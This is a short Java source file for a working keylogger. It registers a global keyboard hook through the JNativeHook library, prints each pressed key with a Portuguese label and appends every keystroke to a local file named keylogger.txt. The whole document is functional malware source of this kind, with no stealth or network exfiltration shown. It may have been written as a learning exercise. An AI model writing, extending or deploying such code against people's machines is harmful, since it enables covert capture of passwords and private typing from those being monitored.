package keylogger.main;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {
	File file = new File("keylogger.txt");
	
	public static void main(String[] args) {
		try {
			GlobalScreen.registerNativeHook();
			
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		System.out.println("Pressionado" + NativeKeyEvent.getKeyText(e.getKeyCode()));
		
		try {
			BufferedWriter buffWrite = new BufferedWriter(new FileWriter(file, true));
			buffWrite.write(NativeKeyEvent.getKeyText(e.getKeyCode())+" ");
			buffWrite.close();
			
		} catch (IOException e1) {
		
			e1.printStackTrace();
		}
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		//System.out.println("Released" + NativeKeyEvent.getKeyText(e.getKeyCode()));
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
	

}
